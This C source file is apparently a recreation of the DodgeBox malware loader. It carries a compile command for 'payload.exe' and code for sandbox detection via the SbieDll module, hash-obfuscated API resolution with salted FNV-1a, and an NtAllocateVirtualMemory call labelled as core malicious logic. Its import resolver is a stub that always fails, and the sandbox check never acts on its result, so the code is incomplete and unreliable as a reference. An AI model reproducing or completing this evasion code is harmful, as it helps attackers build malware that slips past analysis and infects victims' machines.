// This payload detects sandbox environments by checking for the presence of the SbieDll module and halts execution if found. It dynamically resolves API functions using obfuscated hashes to evade detection. The code allocates memory in the process using NtAllocateVirtualMemory, potentially for injecting or executing malicious code. It employs FNV-1a hashing to obscure strings like DLL and function names. These techniques are commonly used in malware for evasion and in-memory execution.

// Автор: S3N4T0R
//manual compile: x86_64-w64-mingw32-gcc DodgeBox.c -o payload.exe -luser32 -lkernel32 -mconsole
// Дата: 2024-12-9

#include <windows.h>
#include <stdio.h>

// Forward declarations
void SbieDll_Hook();
void MalwareMain();
FARPROC ResolveImport(LPCSTR wszDllName, DWORD dwDllNameHash, DWORD dwFuncNameHash);
DWORD fnv1a_salted(const char* data, const char* salt, DWORD seed);

// Global variables
HMODULE hSbieDll_ = NULL;
DWORD dwExportCalled = 0;

void SbieDll_Hook() {
    if (dwExportCalled) {
        Sleep(INFINITE);  // Infinite sleep to halt execution if called again
    } else {
        hSbieDll_ = GetModuleHandleA("SbieDll");
        dwExportCalled = 1;
        MalwareMain();
    }
}

void MalwareMain() {
    // Core malicious logic
    // Example: resolving and calling a function
    FARPROC NtAllocateVirtualMemory = ResolveImport("ntdll", 0xFE0B07B0, 0xCA7BB6AC);
    if (NtAllocateVirtualMemory) {
        PVOID pAllocBase = NULL;
        SIZE_T dwSizeOfImage = 0x1000;
        NTSTATUS status = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))
                           NtAllocateVirtualMemory)(GetCurrentProcess(), &pAllocBase, 0, &dwSizeOfImage, MEM_COMMIT, PAGE_READWRITE);
        if (status == 0) {
            // Memory allocated successfully
        }
    }
}

FARPROC ResolveImport(LPCSTR wszDllName, DWORD dwDllNameHash, DWORD dwFuncNameHash) {
    HMODULE hModule = LoadLibraryA(wszDllName);
    if (!hModule) return NULL;

    // Iterate exports to find a match (not implemented fully here for brevity)
    return NULL;
}

// FNV-1a with salt in C
DWORD fnv1a_salted(const char* data, const char* salt, DWORD seed) {
    DWORD hash = seed ? seed : 0x811C9DC5;
    while (*data) {
        hash ^= *data++;
        hash *= 0x01000193;
    }
    while (*salt) {
        hash ^= *salt++;
        hash *= 0x01000193;
    }
    return hash;
}

int main() {
    SbieDll_Hook();
    return 0;
}

